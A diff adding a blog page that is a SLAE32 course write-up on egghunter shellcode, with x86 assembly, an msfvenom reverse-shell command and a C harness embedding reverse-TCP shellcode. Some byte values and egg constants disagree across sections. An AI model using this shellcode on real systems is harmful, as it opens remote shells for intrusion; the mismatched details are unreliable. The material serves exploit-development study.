@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SLAE32 | Jeremy Catelain</title>
+<meta name="generator" content="Jekyll v3.9.2" />
+<meta property="og:title" content="SLAE32" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description of the assignment Study about the EggHunter shellcode; Create a working demo of the EggHunter; Should be configurable for different payload." />
+<meta property="og:description" content="Description of the assignment Study about the EggHunter shellcode; Create a working demo of the EggHunter; Should be configurable for different payload." />
+<link rel="canonical" href="http://localhost:4000/slae32/2022/10/01/Assign3-EggHunter.html" />
+<meta property="og:url" content="http://localhost:4000/slae32/2022/10/01/Assign3-EggHunter.html" />
+<meta property="og:site_name" content="Jeremy Catelain" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-01T08:45:58+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SLAE32" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-01T08:45:58+02:00","datePublished":"2022-10-01T08:45:58+02:00","description":"Description of the assignment Study about the EggHunter shellcode; Create a working demo of the EggHunter; Should be configurable for different payload.","headline":"SLAE32","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/slae32/2022/10/01/Assign3-EggHunter.html"},"url":"http://localhost:4000/slae32/2022/10/01/Assign3-EggHunter.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jeremy Catelain" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><div class="align-left">
+            <div class="image-cropper"><img src="/images/photo-profil-2.jpg" alt="photo de profil" class="rounded" /></div>
+            <div class="align-left2">
+                <a class="site-title" rel="author" href="/">Jeremy Catelain </a><div class="site-job">Cybersecurity Consultant</div></div>
+        </div><nav class="site-nav">
+            <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+            <label for="nav-trigger">
+                <span class="menu-icon">
+                    <svg viewBox="0 0 18 15" width="18px" height="15px">
+                        <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z" />
+                    </svg>
+                </span>
+            </label>
+
+            <div class="trigger"><a class="page-link" href="/categories/2022-09-14-categories.html">CATEGORIES</a><a class="page-link" href="/">Home</a><a class="page-link" href="/about/">ABOUT</a></div>
+        </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+
+        <div class="wrapper">
+                <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+        <header class="post-header">
+            <div class="post-header-about">
+                <h1 class="post-list-heading2 p-name" itemprop="name headline">SLAE32</h1>
+                <h1 class="post-list-heading3 p-name" itemprop="name headline">|  Assignment 3 - EggHunter</h1>
+            </div>
+            <p class="post-meta-title">
+                <time class="dt-published" datetime="2022-10-01T08:45:58+02:00" itemprop="datePublished">Oct 1, 2022
+                </time></p><a class="github-link-post" href="/TODO"> Github </a></header>
+
+        <div class="post-content e-content" itemprop="articleBody">
+            <h3 id="-description-of-the-assignment-"><span style="color:#2d8fb3;"> Description of the assignment </span></h3>
+
+<ul>
+  <li>Study about the EggHunter shellcode;</li>
+  <li>Create a working demo of the EggHunter;</li>
+  <li>Should be configurable for different payload.</li>
+</ul>
+
+<!--more-->
+
+<h3 id="-principal---what-is-an-egghunter--"><span style="color:#2d8fb3;"> Principal - What is an EggHunter ? </span></h3>
+
+<p>The EggHunter is method used to exploit a buffer overflow vulnerability when the amount of space which could be allocated is not large enought to perform the simple buffer overflow technic by injecting directly the shellcode. Its particularity is that it is a small piece a instruction which will search into the memory for a known pattern that we were able to put somewhere into the memory (for instance in a HTML file) and execute its instructions.</p>
+
+<p>There are few conditions that an egghunter should answer :</p>
+
+<ol>
+  <li>It must be robust : Capable of searching anywhere into the memory and do not crash when it goes through invalids memory regions.</li>
+  <li>It must be small : The main requirement of the EggHunter is that it should be small enough to fit where no other payload would be able
+to fit. The smaller the better.</li>
+  <li>And it must be fast : The searching of the known pattern should be performed as quick as possible without having to wait a long time at each exploitation.</li>
+</ol>
+
+<h3 id="-description-of-the-exploitation-"><span style="color:#2d8fb3;"> Description of the exploitation </span></h3>
+
+<h4 id="egg-definition">Egg definition</h4>
+
+<p>The first things to do is to define the “egg” to searh for into the memory and that will inform our EggHunter that it founds the instruction to execute.
+In this exercise, for this egg, we will use the 8 bytes as follows :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000 90       nop 
+00000001 50       push eax 
+00000002 90       nop 
+00000003 50       push eax 
+00000004 90       nop 
+00000005 50       push eax 
+00000006 90       nop 
+00000007 50       push eax
+</code></pre></div></div>
+
+<p>As a raw buffer, the key becomes a dword 0x50905090 repeated twice in a row. There are 3 reason why we choosed that payload :</p>
+<ol>
+  <li>With two repeated key, it doesn’t have to search for two unique keys one after the other but only to search for one repeated twice ;</li>
+  <li>The 8 bytes length allows to have enought uniqueness;</li>
+  <li>And its instructions allowed the shellcode to be directly executed without having to add more instruction to jump those 8 bytes.</li>
+</ol>
+
+<p>The instruction in our code will be :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov edi, 0x50905090
+</code></pre></div></div>
+
+<h4 id="egghunter-definition">EggHunter definition</h4>
+
+<p>In this paper, we will use the “access” syscall which checks whether the calling process can access a file at a specific pathname.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int access (const char *pathname, int mode);
+</code></pre></div></div>
+
+<p>The pointer in parameter “*pathname” will allow us to access to the memory value of the pointed address. And the return value of this function “EFAULT”, will inform us that the pathname points outside an accessible address space.</p>
+
+<p>The decimal value of the access call is 33 as we can see :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep access
+#define __NR_access 33
+</code></pre></div></div>
+
+<p>So, after the initialization of the Egg’s value, the next step will be to define the function that will be used to go to the next page.
+Knowing that the size of a page is 4096 bytes (can be checked with the command line “getconf PAGESIZE”), we need to create a function to will jump of 4096 bytes if after checking the first address value a EFAULT error is returned. 
+But, the hexadecimal value of 4096 is 0x1000 which contains a NULL so we need to create a function that will avoid null values in the shellcode. To resolve this issue, instead of jumping of 4096 bytes directly, we can create a function that jump of 4095 (0xfff in hexadecimal) and then we will increment the value by 1 afterward.</p>
+
+<p>Here as follows the function :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>next_page : 
+    or dx, 0xfff ; or operation to go to the next page, 4095
+</code></pre></div></div>
+
+<p>The next steps will be to build a function that will go though the page, first check if the address can be access with the “access” syscall, if not it will call the function next_page, and if so, it will go thought the page to search for the Egg. And, when the 4 bytes value of the egg (0x90509050) are find, the next 4 bytes will be compared as well.</p>
+
+<p>First, we create or next function that will make the syscall.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>next_address :
+    inc edx ; the value become 4096 = 0x1000
+    pusha ; save the current registers
+    lea ebx, [edx + 0x4] ; load the address at the first address of the current page
+    mov al, 0x21 ; 0x21 is the heximal value of 33
+    int 0x80 ; access syscall
+</code></pre></div></div>
+
+<p>After the syscall, we need to check that the value returned in EAX is not a EFAULT. The EFAULT error is represented by the decimal value 14 as we can see :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat /usr/include/asm-generic/errno-base.h | grep EFAULT
+#define	EFAULT		14	/* Bad address */
+</code></pre></div></div>
+
+<p>Which gives in binary :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(dec) 14 : (bin) 00001110 
+</code></pre></div></div>
+
+<p>As we known, the return value in case of EFAULT will be in decimal -14 (-EFAULT). its hexadecimal value is obtained with the following steps :</p>
+
+<p>First, we invert the bits of the 14 value which gives 241 :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00001110 =&gt; 11110001 = (dec) 241
+</code></pre></div></div>
+
+<p>And finaly, we add 1 to it :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>11110001 + 1 = 11110010 = (dec) 242 = (hex) 0xf2
+</code></pre></div></div>
+
+<p>So to check if the EFAULT value is return, we need to compare EAX with 0xf2.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmp al, 0xf2
+</code></pre></div></div>
+
+<p>If the values are equals, we need to go to the next page.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>je short next_page
+</code></pre></div></div>
+
+<p>if they are not, we can verify that the value at the current address is equal the our egg (0x90509050).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmp [edx], esi
+</code></pre></div></div>
+
+<p>if they are not equal we can jump to the next address by recurcively calling the next_address function. And if they are equals, we can then check the 4 next bytes of the egg.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jnz next_address ; jump to the next_address if not equals
+cmp [edx + 0x4], esi ; compare the value of the next 4 bytes with our egg (0x90509050)
+jnz next_address ; jump to the next address if not equals
+</code></pre></div></div>
+
+<p>Finally, if the 8 bytes matched, it means that the egg has been found and we can jump to the shellcode.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jmp edx
+</code></pre></div></div>
+
+<h3 id="-c-code--"><span style="color:#2d8fb3;"> C code  </span></h3>
+
+<p>The final step is to define the shellcode that we want to execute. To do that, we used the msfvenom command line as follows to create a reverse tcp shellcode.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell_reverse_tcp RHOST=127.0.0.1 LPORT=5555 -f c
+</code></pre></div></div>
+
+<p>Then, in our C script we will execute the EggHunter shellcode and then store in memory the shellcode that we want to execute with the Egg in front of it.</p>
+
+<p>To do that with the objdump command line, we retrieve the EggHunter shellcode :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment3-EggHunter# objdump -d EggHunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x89\xc6\xbe\x50\x90\x50\x90\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x74\xee\x61\x39\x32\x75\xee\x8d\x5a\x04\x39\x33\x75\xe7\xff\xe2"
+</code></pre></div></div>
+
+<p>We inserted the two paylaod into our C file and finally we compile our C file with the following command line :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -m32 -fno-stack-protector -z execstack -o Egg Egg_Hunter.c 
+</code></pre></div></div>
+
+<p>We verified our shellcode by launching on one side the netcat command line and on the other side our EggHunter executable.</p>
+
+<p><img src="/assets/slae32-img/assignment3/final.PNG" alt="drawing" style="width:100%;" /></p>
+
+<p><em>Useful link:</em></p>
+<ul>
+  <li><a href="https://www.secpod.com/blog/hunting-the-egg-egg-hunter/" style="color:#2d8fb3;">www.secpod.com</a></li>
+  <li><a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" style="color:#2d8fb3;">www.hick.org</a></li>
+  <li><a href="https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf" style="color:#2d8fb3;">www.exploit-db.com</a></li>
+  <li><a href="https://medium.com/@chaudharyaditya/slae-0x3-egg-hunter-shellcode-6fe367be2776#:~:text=An%20egghunter%20is%20a%20short,pass%20control%20to%20the%20shellcode" style="color:#2d8fb3;">medium.com</a></li>
+</ul>
+
+<h3 id="-source-codes--"><span style="color:#2d8fb3;"> Source Codes  </span></h3>
+
+<h4 id="assembly-code">Assembly code</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>global _start
+
+section .text
+_start:
+
+    xor eax, eax ; initialization of the EAX register
+    mov esi, eax ; initialization of the ESI register
+
+    ; Egg initialization
+    mov esi, dword 0x50905090
+
+next_page : 
+    or dx, 0xfff ; or operation to go to the next page, 4095
+
+
+next_address :
+    inc edx ; the value become 4096 = 0x1000
+    pusha ; save the current registers
+    lea ebx, [edx + 0x4] ; load the address at the first address of the current page
+    mov al, 0x21 ; 0x21 is the heximal value of 33
+    int 0x80 ; access syscal
+
+    cmp al, 0xf2 ; Check if the return value is a EFAULT
+    popa ; get the registers back
+    je short next_page ; in case of EFAULT, go to the next page
+
+    cmp [edx], esi ; compare the value at the address with our egg
+    jnz next_address ; jump to the next_address if not equals
+    cmp [edx + 0x4], esi ; compare the value of the next 4 bytes with our egg (0x90509050)
+
+    jnz next_address ; jump to the next address if not equals
+
+    jmp edx ; jump to the shellcode if the egg is found
+</code></pre></div></div>
+
+<h4 id="c-code">C code</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+unsigned char EggHunter [] = \
+"\x31\xc0\x89\xc6\xbe\x90\x50\x90\x50\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x32\x75\xee\x39\x72\x04\x75\xe9\xff\xe2";
+
+unsigned char shellcode [] = \
+    "\x90\x50\x90\x50\x90\x50\x90\x50" // Egg
+    "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+    "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68"
+    "\x02\x00\x15\xb3\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
+    "\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+    "\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+main() {
+    printf("Shellcode Length: %d\n", strlen(EggHunter));
+
+    int (*ret)() = (int(*)())EggHunter;
+
+    ret();
+}
+</code></pre></div></div>
+
+
+        </div>
+
+
+        <!--<a class="u-url" href="/slae32/2022/10/01/Assign3-EggHunter.html" hidden></a>
+          -->
+    </article>
+
+        </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+      <!--<h2 class="footer-heading">Jeremy Catelain</h2> -->
+
+    <div class="Github-link"></div>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <!--<ul class="contact-list">
+          <li class="p-name">Jeremy Catelain</li>
+        </ul> -->
+      </div>
+
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a class="social-media-listed" href="https://github.com/jeremycatelain"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jeremycatelain</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+          <p>COPYRIGHT 2022 JEREMY CATELAIN - ALL RIGHTS RESERVED.</p>
+      </div>
+  </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
